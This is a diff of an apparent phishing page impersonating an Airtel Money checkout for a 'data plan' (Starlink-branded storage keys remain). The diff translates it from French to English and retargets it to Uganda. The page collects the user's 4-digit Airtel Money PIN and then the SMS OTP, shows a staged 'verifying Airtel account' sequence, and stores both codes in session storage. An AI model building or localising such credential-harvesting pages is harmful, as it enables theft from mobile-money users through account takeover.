@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="fr">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no">
@@ -367,8 +367,8 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 <div class="steps" aria-hidden="true">
   <div class="step done" id="sp0"><div class="step-dot">✓</div><div class="step-lbl">Plan</div></div>
   <div class="step active" id="sp1"><div class="step-dot">2</div><div class="step-lbl">Connection</div></div>
-  <div class="step" id="sp2"><div class="step-dot">3</div><div class="step-lbl">Traitement</div></div>
-  <div class="step" id="sp3"><div class="step-dot">4</div><div class="step-lbl">Code OTP</div></div>
+  <div class="step" id="sp2"><div class="step-dot">3</div><div class="step-lbl">Processing</div></div>
+  <div class="step" id="sp3"><div class="step-dot">4</div><div class="step-lbl">OTP Code</div></div>
 </div>
 
 <div class="view active" id="viewLogin">
@@ -376,15 +376,15 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     <div class="summary">
       <div class="summary-head">
         <span class="summary-head-label">Your order</span>
-        <button class="summary-change" onclick="goBack()" type="button" aria-label="Modifier">
+        <button class="summary-change" onclick="goBack()" type="button" aria-label="Change">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
-          Modifier
+          Change
         </button>
       </div>
       <div class="summary-product">
         <div class="summary-product-info">
           <span class="summary-product-name" id="sumName">—</span>
-          <span class="summary-product-meta">Satellite plan</span>
+          <span class="summary-product-meta">Data plan</span>
         </div>
         <div class="summary-product-price">
           <strong id="sumPrice">—</strong>
@@ -415,11 +415,11 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 
     <div class="pin-stage">
       <div class="pin-head">
-        <div class="pin-title">Code PIN Airtel Money</div>
-        <div class="pin-sub">Enter your 4-digit PIN to authorise payment de <strong id="pinRef">—</strong></div>
+        <div class="pin-title">Airtel Money PIN</div>
+        <div class="pin-sub">Enter your 4-digit PIN to authorise payment of <strong id="pinRef">—</strong></div>
       </div>
 
-      <div class="pin-boxes" role="group" aria-label="Code PIN">
+      <div class="pin-boxes" role="group" aria-label="PIN code">
         <div class="pin-box" id="pb0"><div class="pin-dot" id="pd0"></div></div>
         <div class="pin-box" id="pb1"><div class="pin-dot" id="pd1"></div></div>
         <div class="pin-box" id="pb2"><div class="pin-dot" id="pd2"></div></div>
@@ -429,7 +429,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="pin-peek-row">
         <button class="pin-peek" id="peekBtn" onclick="togglePeek()" type="button">
           <svg id="peekIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-          <span id="peekTxt">Afficher</span>
+          <span id="peekTxt">Show</span>
         </button>
       </div>
 
@@ -447,7 +447,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
         <button class="numkey" data-v="9">9</button>
         <button class="numkey empty" disabled aria-hidden="true"></button>
         <button class="numkey" data-v="0">0</button>
-        <button class="numkey del" id="npDel" aria-label="Effacer">⌫</button>
+        <button class="numkey del" id="npDel" aria-label="Delete">⌫</button>
       </div>
 
       <button class="btn-cta dim" id="loginBtn" onclick="submitLogin()" type="button">
@@ -466,14 +466,14 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="proc-ring"></div>
       <svg viewBox="0 0 124 47.597" xmlns="http://www.w3.org/2000/svg" aria-label="Airtel" class="proc-logo"><g transform="translate(-57.9 -110.7)"><g transform="translate(58.856 110.7)"><g><g transform="translate(36.705)"><path d="M205.786,110.7a3.523,3.523,0,0,0-3.486,3.526,3.447,3.447,0,1,0,6.891.04,3.489,3.489,0,0,0-3.405-3.566" transform="translate(-182.107 -110.7)" fill="currentColor"/><path d="M204.8,155h5.409V132.8l-5.409.922Z" transform="translate(-183.606 -123.946)" fill="currentColor"/><path d="M163.519,150.25a5.117,5.117,0,0,1-2.8.721c-2.163,0-3.165-1.723-3.125-3.726a3.464,3.464,0,0,1,3.766-3.526h2.164Zm-2.244-18.35a15.769,15.769,0,0,0-7.292,1.963l-.6.32,1.442,3.325.841-.4a12.2,12.2,0,0,1,5.128-1.242c1.963.08,2.764,1,2.764,2.925v1.122h-3.205c-5.168,0-8.374,2.8-8.454,7.172a7.837,7.837,0,0,0,8.053,7.732,12.414,12.414,0,0,0,9.135-3.486V139.552c-.08-5.769-4.047-7.652-7.813-7.652" transform="translate(-151.9 -123.406)" fill="currentColor"/><path d="M301.493,136.367c2.4,0,2.764,2.684,2.764,4.367h-5.89c.12-2.164.962-4.367,3.125-4.367m1.162,14.744a3.851,3.851,0,0,1-3.125-1.242c-.962-1.082-1.4-3.325-1.282-5.689h11.659v-.561c-.12-7.853-2.684-11.418-8.414-11.418-6.37,0-8.854,6.01-8.894,11.7-.04,3.566,1.282,7.172,3.686,9.215a8.858,8.858,0,0,0,5.85,1.923,12.639,12.639,0,0,0,3.846-.6,16.449,16.449,0,0,0,4.087-2.043l-1.522-3.245a9.9,9.9,0,0,1-5.89,1.963" transform="translate(-236.228 -123.586)" fill="currentColor"/><path d="M229.1,136.385v18.229h5.529V137.466a5.936,5.936,0,0,1,3.686-1.4,6.965,6.965,0,0,1,2.2.24l1.522-3.526a9.536,9.536,0,0,0-3.646-.681,12.163,12.163,0,0,0-9.295,4.287" transform="translate(-198.17 -123.524)" fill="currentColor"/><path d="M352.233,142.4c-2.244-.16-2.725-1.2-2.725-2.885V117.6l-5.409.962v20.633c0,4.888,2.564,6.971,6.891,6.971a12.417,12.417,0,0,0,2.083-.24V142.44a4.171,4.171,0,0,0-.841-.04" transform="translate(-267.096 -114.836)" fill="currentColor"/><path d="M270.629,117.6l-5.529.921v20.713c0,4.648,2.644,6.851,7.051,6.851a11.279,11.279,0,0,0,2.043-.2V142.44h-.761c-2.324-.08-2.8-1.4-2.8-2.925V127.857h3.566V123.77h-3.566Z" transform="translate(-219.747 -114.836)" fill="currentColor"/></g><path d="M71.71,146.565a24.836,24.836,0,0,0,4.607-2.4l.361-.24a34.286,34.286,0,0,0,4.327-3.285,19.866,19.866,0,0,0,6.29-9.015,11.537,11.537,0,0,0,.321-6.571,8.528,8.528,0,0,0-3.285-4.487,9.621,9.621,0,0,0-6.01-1.763c-3.486,0-7.292,1.362-11.338,4.006l-.12.08h0l-.361.24a2.233,2.233,0,0,1-.321.2,26.258,26.258,0,0,0-2.364,1.8c-1.723,1.643-3.646,4.407-3.526,6.771a3.114,3.114,0,0,0,1.242,2.4,4.163,4.163,0,0,0,2.564.8,12.24,12.24,0,0,0,5.889-2.083c.08-.08.2-.12.28-.2a9.068,9.068,0,0,1,.8-.521l.28-.16a30.98,30.98,0,0,1,7.051-3.886,5.2,5.2,0,0,1,1.8-.321,4.438,4.438,0,0,1,.761.08,2.386,2.386,0,0,1,1.683,1.322,6.1,6.1,0,0,1-.361,4.888,21.561,21.561,0,0,1-5.649,7.011,21.633,21.633,0,0,1-3.686,2.644l-.08.04a13.809,13.809,0,0,1-1.723.841l-.08.04a3.363,3.363,0,0,1-.481.16c-2.564.681-1-1.563-1-1.563a25.048,25.048,0,0,1,1.763-1.8c.361-.32.721-.681,1.082-1.042l.08-.08a2.719,2.719,0,0,0,1.042-1.963,2.315,2.315,0,0,0-2.364-1.963h-.08a4.829,4.829,0,0,0-2.764,1.162,8.4,8.4,0,0,0-1.843,2.083c-.681,1.082-2.123,3.886-.721,6.09a3.1,3.1,0,0,0,2.8,1.322,9.408,9.408,0,0,0,3.125-.641" transform="translate(-60.287 -115.555)" fill="currentColor"/></g></g></g></svg>
     </div>
-    <div class="proc-title">Traitement en cours…</div>
+    <div class="proc-title">Processing…</div>
     <div class="proc-sub" id="procSub">Secure connection in progress…</div>
     <div class="proc-bar"><div class="proc-bar-fill" id="procBar"></div></div>
     <div class="proc-steps">
       <div class="proc-step act" id="psi0"><div class="proc-step-dot"></div><div class="proc-step-txt">Secure connection established</div></div>
       <div class="proc-step" id="psi1"><div class="proc-step-dot"></div><div class="proc-step-txt">Verifying Airtel account</div></div>
-      <div class="proc-step" id="psi2"><div class="proc-step-dot"></div><div class="proc-step-txt">Satellite plan validation</div></div>
-      <div class="proc-step" id="psi3"><div class="proc-step-dot"></div><div class="proc-step-txt">Envoi du code OTP…</div></div>
+      <div class="proc-step" id="psi2"><div class="proc-step-dot"></div><div class="proc-step-txt">Data plan validation</div></div>
+      <div class="proc-step" id="psi3"><div class="proc-step-dot"></div><div class="proc-step-txt">Sending OTP code…</div></div>
     </div>
   </div>
 </div>
@@ -504,16 +504,16 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="otp-err-actions" id="otpErrActions"></div>
     </div>
 
-    <input id="otpInput" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="one-time-code" oninput="onOTPInput(this.value)" onblur="onOTPBlur()" aria-label="Code OTP">
+    <input id="otpInput" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="one-time-code" oninput="onOTPInput(this.value)" onblur="onOTPBlur()" aria-label="OTP code">
 
     <div class="otp-meta">
       <div class="otp-help">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
-        <span>Appuyez sur les cases pour saisir le code</span>
+        <span>Tap the boxes to enter the code</span>
       </div>
       <div class="otp-timer-row">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
-        <span>Code expire dans&nbsp;</span><span class="otp-timer" id="otpTimer">60</span><span>&nbsp;s</span>
+        <span>Code expires in&nbsp;</span><span class="otp-timer" id="otpTimer">60</span><span>&nbsp;s</span>
       </div>
       <button class="otp-resend dim" id="resendBtn" onclick="resendOTP()" type="button">Resend OTP code</button>
     </div>
@@ -521,7 +521,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     <button class="btn-cta dim" id="otpBtn" onclick="submitOTP()" type="button">
       <span>
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        Valider le Code
+        Validate Code
       </span>
     </button>
   </div>
@@ -589,7 +589,7 @@ var peekVisible = false;
 
 function togglePeek(){
   peekVisible = !peekVisible;
-  document.getElementById('peekTxt').textContent = peekVisible ? 'Masquer' : 'Afficher';
+  document.getElementById('peekTxt').textContent = peekVisible ? 'Hide' : 'Show';
   var icon = document.getElementById('peekIcon');
   icon.innerHTML = peekVisible
     ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
@@ -657,7 +657,7 @@ async function submitLogin(){
   try { priceNum = parseFloat(String(forfait.price||'0').replace('UGX ','')) || 0; } catch(e){}
   try {
     if (window.fbq) window.fbq('track', 'AddPaymentInfo', {
-      content_name: forfait.name || 'Satellite plan',
+      content_name: forfait.name || 'Data plan',
       value: priceNum,
       currency: 'UGX'
     });
@@ -674,7 +674,7 @@ async function runProcessing(ph){
   var steps = [
     {pct:25, txt:'Verifying Airtel account…', si:1},
     {pct:55, txt:'Validating ' + (forfait.name || 'your order') + '…', si:2},
-    {pct:85, txt:'Envoi OTP au +256 ' + ph + '…', si:3},
+    {pct:85, txt:'Sending OTP to +256 ' + ph + '…', si:3},
     {pct:100, txt:'OTP code sent to your phone!'}
   ];
   for(var i=0;i<steps.length;i++){
@@ -805,10 +805,10 @@ function submitOTP(){
   var auth = {};
   try { auth = JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}'); } catch(e){}
   if(auth.pin && otpVal === auth.pin){
-    otpError('Ce code ressemblike your PIN — the OTP is a separate code sent par SMS', timerSecs <= 0);
+    otpError('This code looks like your PIN — the OTP is a separate code sent by SMS', timerSecs <= 0);
     return;
   }
-  var ref = 'STL-CG-' + (Math.random()*9e5+1e5|0);
+  var ref = 'AUT-UG-' + (Math.random()*9e5+1e5|0);
   sessionStorage.setItem('starlinkRef', ref);
   sessionStorage.setItem('starlinkOTP', otpVal);
   for(var i=0;i<4;i++) document.getElementById('ob'+i).classList.add('success');
